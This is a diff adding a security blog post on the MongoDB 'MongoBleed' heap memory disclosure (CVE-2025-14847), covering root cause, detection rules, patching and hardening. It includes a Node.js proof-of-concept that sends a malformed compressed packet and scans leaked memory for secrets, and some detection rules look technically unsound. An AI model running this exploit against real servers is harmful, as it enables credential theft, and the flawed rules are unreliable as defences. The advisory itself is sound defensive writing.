@@ -1,0 +1,495 @@
+---
+title: "MongoBleed: Pre-Authentication Heap Memory Disclosure in MongoDB (CVE-2025-14847)"
+summary: "A critical information disclosure vulnerability in MongoDB's network protocol that allows unauthenticated remote attackers to read sensitive data from server heap memory."
+publishedAt: 2026-01-02
+category: "Security"
+draft: false
+---
+
+MongoBleed represents a critical information disclosure vulnerability in MongoDB's network protocol implementation that allows unauthenticated remote attackers to read sensitive data directly from server heap memory. Discovered and disclosed on December 19, 2025, this vulnerability carries a CVSS score of 7.5 and affects MongoDB deployments with zlib compression enabled a common default configuration.
+
+What makes MongoBleed particularly dangerous is its pre-authentication nature. Attackers require no credentials, no special privileges, and no prior access to the database. A single TCP connection to an exposed MongoDB instance is sufficient to begin extracting sensitive information including authentication credentials, API keys, session tokens, and other confidential data residing in adjacent heap memory allocations.
+
+The vulnerability has been actively exploited within 24 hours of public disclosure, with scanning campaigns targeting internet-facing MongoDB instances globally. Organizations running self-hosted MongoDB deployments must treat this as a critical incident requiring immediate remediation.
+
+## Impact and Security Implications
+
+MongoBleed significantly expands the attack surface of MongoDB deployments:
+
+- No authentication required
+- Triggered during initial protocol negotiation
+- Affects default compression configurations
+- Leaks sensitive heap memory contents
+- Enables credential harvesting and lateral movement
+
+Exposed MongoDB instances on port **27017** are particularly at risk, especially in self-hosted environments where network isolation is not enforced.
+
+## Technical Root Cause
+
+MongoBleed originates from a subtle but critical programming error in MongoDB's message compression handling code, specifically in the `message_compressor_zlib.cpp` file. The vulnerability stems from incorrect length calculation during the decompression of network protocol messages.
+
+### The Flawed Implementation
+
+When MongoDB receives a compressed message over the network, it must decompress the payload before processing. The decompression logic is supposed to return the actual size of the decompressed data. However, due to a programming error, the code returns the allocated buffer size (`output.length()`) instead of the actual decompressed data length.
+
+This discrepancy creates a critical vulnerability: when an attacker sends an undersized compressed payload, the server allocates a buffer based on claimed decompressed size but only fills a portion of it with actual data. The remaining buffer space contains whatever data happened to be in that heap memory location previously—potentially including sensitive information from prior operations.
+
+### Vulnerable Code Pattern
+
+```cpp
+// Simplified vulnerable code in message_compressor_zlib.cpp
+
+Status ZlibMessageCompressor::decompress(
+    const ConstDataRange& input,
+    DataRange* output
+) {
+    z_stream stream;
+    // ... initialization code ...
+
+    int ret = inflate(&stream, Z_FINISH);
+
+    if (ret != Z_STREAM_END) {
+        return Status(ErrorCodes::BadValue, "Decompression failed");
+    }
+
+    // VULNERABILITY: Returns allocated buffer size instead of actual data size
+    // This causes uninitialized heap memory to be included in response
+    return output->length();  // Should be: stream.total_out
+}
+```
+
+## Memory Disclosure Mechanism
+
+```mermaid
+flowchart LR
+    A[Compressed Input]
+    B[Allocated Output Buffer]
+    C[Actual Decompressed Data]
+    D[Uninitialized Heap Memory]
+    E[Response Sent to Attacker]
+
+    A --> B
+    B --> C
+    B --> D
+    C --> E
+    D --> E
+```
+
+### What Gets Leaked
+
+Leaked heap memory may contain:
+
+- Database usernames and passwords
+- API keys and secrets
+- Session tokens (JWTs)
+- BSON document fragments
+- Internal server state
+
+## Attack Flow Breakdown
+
+MongoBleed exploitation follows a straightforward attack pattern that can be executed by any attacker with network access to a vulnerable MongoDB instance.
+
+```mermaid
+flowchart LR
+    A[Attacker]
+    B[MongoDB Port 27017]
+    C[OP_COMPRESSED Message]
+    D[zlib Decompression]
+    E[Heap Over-Read]
+    F[Leaked Memory]
+
+    A -->|Scan & Connect| B
+    B -->|Malformed Payload| C
+    C -->|Incorrect Length Handling| D
+    D -->|Uninitialized Memory| E
+    E -->|Response| F
+
+```
+
+### Exploitation Requirements
+
+The simplicity of exploitation is what makes MongoBleed particularly concerning:
+
+- **Network Reachability:** Ability to connect to MongoDB port 27017 (or custom port)
+- **zlib Compression Enabled:** Server must have zlib compression support (common default)
+- **No Authentication Required:** Vulnerability triggered before authentication checks
+- **Single TCP Connection:** One connection sufficient for exploitation
+- **No Special Privileges:** Works from completely unprivileged network position
+
+### Proof of Concept Attack Code
+
+```js
+// Simplified MongoBleed exploitation example
+
+const net = require("net");
+const zlib = require("zlib");
+
+function exploitMongoBleed(targetHost, targetPort) {
+  const client = net.connect(targetPort, targetHost, () => {
+    console.log("Connected to MongoDB target");
+
+    // Create minimal BSON document
+    const minimalBSON = Buffer.from([
+      0x05,
+      0x00,
+      0x00,
+      0x00,
+      0x00, // 5-byte empty BSON
+    ]);
+
+    // Compress it (results in ~10 bytes)
+    const compressed = zlib.deflateSync(minimalBSON);
+
+    // Craft OP_COMPRESSED message claiming large decompressed size
+    const messageHeader = Buffer.alloc(16);
+    messageHeader.writeInt32LE(16 + compressed.length, 0); // Total message length
+    messageHeader.writeInt32LE(1, 4); // Request ID
+    messageHeader.writeInt32LE(0, 8); // Response to
+    messageHeader.writeInt32LE(0x2012, 12); // OP_COMPRESSED (0x2012)
+
+    // Compression details
+    const compressionHeader = Buffer.alloc(9);
+    compressionHeader.writeInt32LE(0x2004, 0); // Original opcode
+    compressionHeader.writeInt32LE(4096, 4); // FALSE claim: 4096 bytes uncompressed
+    compressionHeader.writeInt8(0x02, 8); // Compressor ID (zlib)
+
+    // Send malicious packet
+    const payload = Buffer.concat([
+      messageHeader,
+      compressionHeader,
+      compressed,
+    ]);
+
+    client.write(payload);
+    console.log("Malicious packet sent - waiting for heap memory leak...");
+  });
+
+  client.on("data", (data) => {
+    console.log(`Received ${data.length} bytes (contains heap memory!)`);
+    console.log("Leaked data sample:", data.toString("hex").substring(0, 200));
+
+    // Parse for sensitive patterns
+    const dataStr = data.toString("utf8", { errors: "ignore" });
+    if (dataStr.match(/password|token|key|secret/i)) {
+      console.log("⚠️  Potential credentials found in leaked memory!");
+    }
+
+    client.end();
+  });
+
+  client.on("error", (err) => {
+    console.error("Connection error:", err.message);
+  });
+}
+
+// Usage
+exploitMongoBleed("vulnerable-mongodb.example.com", 27017);
+```
+
+## Detection & Indicators of Compromise
+
+Organizations should implement comprehensive monitoring to detect MongoBleed exploitation attempts and assess whether they have been compromised. Detection focuses on network traffic anomalies and memory access patterns characteristic of this vulnerability.
+
+### Network Traffic Indicators
+
+Monitor network traffic destined for MongoDB servers (typically port 27017) for the following suspicious patterns:
+
+- **OP_COMPRESSED Messages:** Watch for OP_COMPRESSED opcode (0x2012) with inconsistent compressed/decompressed length ratios
+- **Undersized Payloads:** zlib-compressed payloads smaller than 100 bytes claiming large decompressed sizes (1KB+)
+- **Repeated Connections:** Multiple TCP connections from same source with compression probes
+- **Abnormal Response Sizes:** Server responses significantly larger than request complexity warrants
+- **Non-BSON Data in Responses:** Binary data that doesn't conform to BSON structure (leaked heap garbage)
+
+### Wireshark Detection Filter
+
+```wireshark
+# Wireshark filter to detect potential MongoBleed exploitation
+
+tcp.port == 27017 &&
+tcp.payload[12:2] == 12:20 &&   # OP_COMPRESSED opcode
+tcp.len < 100                  # Suspiciously small payload
+
+```
+
+### Sysdig Falco Detection Rules
+
+Sysdig has released specialized Falco rules for MongoBleed detection that monitor system calls and network behavior.
+
+```yaml
+# Falco rule for MongoBleed detection
+
+- rule: MongoBleed Exploitation Attempt
+  desc: Detects potential MongoBleed heap memory disclosure
+  condition: >
+    (proc.name = "mongod") and
+    (evt.type = "read" or evt.type = "write") and
+    (fd.sport = 27017 or fd.dport = 27017) and
+    (evt.buffer contains "zlib" or evt.rawres contains "compressed")
+  output: >
+    Possible MongoBleed exploitation detected
+    (user=%user.name process=%proc.name connection=%fd.name buffer_size=%evt.buflen)
+  priority: CRITICAL
+
+# Rule for abnormal heap memory access patterns
+
+- rule: MongoBleed Memory Disclosure Pattern
+  desc: Detects unusual memory access during compression
+  condition: >
+    (proc.name = "mongod") and
+    (evt.type = "mmap" or evt.type = "munmap") and
+    (evt.arg.request contains "PROT_READ") and
+    (fd.sport = 27017)
+  output: >
+    Suspicious memory access pattern in mongod process
+    (user=%user.name addr=%evt.arg.addr size=%evt.arg.length)
+  priority: WARNING
+```
+
+### Elastic Stack Detection Query
+
+```json
+// Elasticsearch query for MongoBleed indicators
+GET /network-logs-*/_search
+{
+  "query": {
+    "bool": {
+      "must": [
+        {
+          "term": {
+            "destination.port": 27017
+          }
+        },
+        {
+          "match": {
+            "network.protocol": "mongodb"
+          }
+        }
+      ],
+      "should": [
+        {
+          "match": {
+            "event.payload": "OP_COMPRESSED"
+          }
+        },
+        {
+          "match": {
+            "event.payload": "zlib"
+          }
+        }
+      ],
+      "filter": {
+        "range": {
+          "source.bytes": {
+            "lt": 100
+          }
+        }
+      }
+    }
+  }
+}
+
+```
+
+### Log Analysis for Historical Compromise
+
+Organizations should review MongoDB logs for signs of historical exploitation:
+
+```bash
+# Search MongoDB logs for suspicious compression activity
+grep -i "compressed" /var/log/mongodb/mongod.log | \
+grep -E "(error|warning|unusual)"
+
+# Look for connection patterns from unknown sources
+grep "connection accepted" /var/log/mongodb/mongod.log | \
+awk '{print $NF}' | sort | uniq -c | sort -rn
+
+# Identify abnormally large response sizes
+grep -i "response" /var/log/mongodb/mongod.log | \
+awk '{if($6 > 10000) print $0}'
+
+```
+
+## Mitigation Steps
+
+Organizations must take immediate action to protect MongoDB deployments from MongoBleed exploitation. The following mitigation strategies provide layered defense against this vulnerability.
+
+### 1. Patch Immediately
+
+Upgrade to MongoDB versions that include the fix for CVE-2025-14847. This is the most comprehensive solution.
+
+```bash
+# Check current MongoDB version
+mongod --version
+
+# Stop MongoDB service
+sudo systemctl stop mongod
+
+# Backup configuration and data (CRITICAL!)
+sudo mongodump --out /backup/pre-mongobleed-patch
+
+# Update MongoDB (Ubuntu/Debian)
+sudo apt update
+sudo apt install mongodb-org=8.0.5 mongodb-org-server=8.0.5
+
+# Update MongoDB (RHEL/CentOS)
+sudo yum update mongodb-org-8.0.5 mongodb-org-server-8.0.5
+
+# Start MongoDB service
+sudo systemctl start mongod
+
+# Verify patched version
+mongod --version | grep "8.0.5"
+
+```
+
+### 2. Disable zlib Compression
+
+If immediate patching is not possible, disable zlib compression to eliminate the attack vector.
+
+```yaml
+# Edit MongoDB configuration file (/etc/mongod.conf)
+
+net:
+  compression:
+    compressors: "snappy,zstd"   # Remove zlib, keep other compressors
+
+# Alternative: Disable all compression
+net:
+  compression:
+    compressors: "none"
+
+```
+
+### 3. Implement Network-Level Controls
+
+Restrict MongoDB port 27017 access to only trusted IP addresses using firewall rules
+
+```bash
+# UFW (Ubuntu/Debian)
+sudo ufw deny 27017/tcp
+sudo ufw allow from 10.0.0.0/8 to any port 27017 proto tcp
+sudo ufw allow from 192.168.1.0/24 to any port 27017 proto tcp
+
+# iptables
+sudo iptables -A INPUT -p tcp --dport 27017 -s 10.0.0.0/8 -j ACCEPT
+sudo iptables -A INPUT -p tcp --dport 27017 -s 192.168.1.0/24 -j ACCEPT
+sudo iptables -A INPUT -p tcp --dport 27017 -j DROP
+
+# Save iptables rules
+sudo iptables-save > /etc/iptables/rules.v4
+
+# AWS Security Group (CLI)
+aws ec2 authorize-security-group-ingress \
+  --group-id sg-xxxxx \
+  --protocol tcp \
+  --port 27017 \
+  --cidr 10.0.0.0/8
+```
+
+### 4. Deploy IDS / Runtime Detection
+
+Implement application-level protection using Web Application Firewall rules.
+
+```json
+// Cloudflare WAF custom rule
+{
+  "expression": "(cf.edge.server_port eq 27017) and (http.request.body.raw contains \"zlib\" or http.request.headers[\"x-mongodb-compression\"][0] eq \"zlib\")",
+  "action": "block",
+  "description": "Block MongoBleed exploitation attempts"
+}
+```
+
+```apache
+# ModSecurity rule
+SecRule REQUEST_URI "@rx ^.*:27017" \
+  "id:100001,phase:1,deny,status:403,msg:'MongoDB port blocked'"
+```
+
+```snort
+# Snort IDS signature
+alert tcp any any -> any 27017 (
+  msg:"MongoBleed exploitation attempt";
+  content:"|12 20|";        # OP_COMPRESSED opcode
+  dsize:<100;
+  reference:cve,2025-14847;
+  classtype:attempted-admin;
+  sid:1000001;
+  rev:1;
+)
+```
+
+### 5. Rotate Credentials
+
+If you suspect your MongoDB instance may have been compromised, immediately rotate all credentials.
+
+```js
+// MongoDB shell - Rotate user passwords
+
+use admin
+db.changeUserPassword("admin", "NEW_SECURE_PASSWORD")
+db.changeUserPassword("appUser", "NEW_SECURE_PASSWORD")
+
+// Update application connection strings
+// OLD: mongodb://admin:oldpass@host:27017/db
+// NEW: mongodb://admin:newpass@host:27017/db
+
+// Revoke and regenerate API keys that may have been exposed
+// Check application logs for any unauthorized access patterns
+```
+
+## Real-World Exploitation Impact
+
+MongoBleed has demonstrated significant real-world impact within hours of public disclosure, with attackers rapidly weaponizing the vulnerability to compromise database infrastructure globally.
+
+### Documented Attack Campaigns
+
+- **Mass Scanning Operations:** Within 24 hours, automated scanners probed millions of IPv4 addresses for open MongoDB ports (27017)
+- **Credential Harvesting:** Attackers extract database passwords, API keys, and JWT tokens from heap memory leaks
+- **Lateral Movement:** Harvested credentials used to pivot to adjacent systems and cloud infrastructure
+- **Data Exfiltration:** Once authenticated via leaked credentials, attackers dump entire databases
+- **Ransomware Deployment:** Compromised MongoDB instances used as initial access for ransomware campaigns
+
+### Types of Sensitive Data Exposed
+
+Heap memory in MongoDB servers frequently contains high-value targets:
+
+- **Authentication Credentials:** Database usernames and passwords from recent authentication attempts
+- **API Keys:** Application API keys used in connection strings
+- **Session Tokens:** JWT tokens and session identifiers from web applications
+- **Document Fragments:** Partial or complete BSON documents from other users' queries
+- **Connection Strings:** Full MongoDB URIs including credentials for other databases
+- **Encryption Keys:** Client-side field encryption keys stored in memory
+- **PII Data:** Personally identifiable information from cached query results
+
+## Long-Term Security Recommendations
+
+Beyond immediate MongoBleed mitigation, organizations should implement comprehensive security measures to protect database infrastructure:
+
+### 1. Network Security Architecture
+
+- Never expose MongoDB directly to the internet—always place behind VPN, bastion hosts, or private cloud networks
+- Implement network segmentation to isolate database tier from application and presentation tiers
+- Use VPC peering or private link for cloud-to-cloud database connections
+- Deploy intrusion detection systems (IDS) on database network segments
+
+### 2. Authentication & Access Control
+
+- Enable MongoDB authentication (--auth) on all deployments
+- Implement role-based access control (RBAC) with principle of least privilege
+- Use certificate-based authentication for application connections
+- Rotate database credentials quarterly or after any suspected compromise
+- Implement multi-factor authentication (MFA) for administrative access
+
+### 3. Encryption
+
+- Enable TLS/SSL for all client connections to encrypt data in transit
+- Implement MongoDB encryption at rest for sensitive data
+- Use client-side field level encryption (CSFLE) for highly sensitive fields
+- Store encryption keys in dedicated key management systems (AWS KMS, Azure Key Vault, HashiCorp Vault)
+
+### 4. Monitoring & Auditing
+
+- Enable MongoDB audit logging to track all database operations
+- Implement SIEM integration for real-time security event correlation
+- Set up alerting for suspicious patterns (failed auth attempts, unusual query patterns, large data exports)
+- Regularly review user privileges and remove unnecessary
